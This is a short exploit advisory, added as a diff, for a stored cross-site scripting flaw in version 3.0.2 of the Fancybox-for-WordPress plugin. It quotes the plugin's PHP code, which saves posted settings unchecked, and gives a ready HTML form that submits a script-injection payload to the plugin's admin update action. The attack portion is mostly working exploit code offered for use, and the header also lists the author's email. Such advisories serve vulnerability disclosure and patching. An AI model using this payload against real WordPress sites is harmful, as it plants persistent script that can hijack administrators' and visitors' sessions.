@@ -1,0 +1,28 @@
+# Exploit Title: Wordpress plugin Fancybox-for-WordPress Stored XSS
+# Exploit Author: NULLpOint7r
+# Date: 2015-02-11
+# Contact me: seidbenseidok@gmail.com
+# Version: 3.0.2
+# Download link: https://downloads.wordpress.org/plugin/fancybox-for-wordpress.3.0.2.zip
+# Home: http://www.sec4ever.com/home/
+
+vulnerable code [fancybox.php]:
+342.    if ( isset($_GET['page']) && $_GET['page'] == 'fancybox-for-wordpress' ) {
+343.
+344.        if ( isset($_REQUEST['action']) && 'update' == $_REQUEST['action'] ) {
+345.
+346.            $settings = stripslashes_deep( $_POST['mfbfw'] );
+347.            $settings = array_map( 'convert_chars', $settings );
+348.
+349.            update_option( 'mfbfw', $settings );
+350.            wp_safe_redirect( add_query_arg('updated', 'true') );  
+
+exploit: 
+
+<form method="POST" action="http://127.0.0.1/wp-admin/admin-post.php?page=fancybox-for-wordpress">
+    <input type="text" name="action" value="update">
+    <input type="text" name="mfbfw[padding]" value="</script><script>alert(/Owned by someone/)</script>">
+    <input type="submit" value="Send">
+</form>
+
+
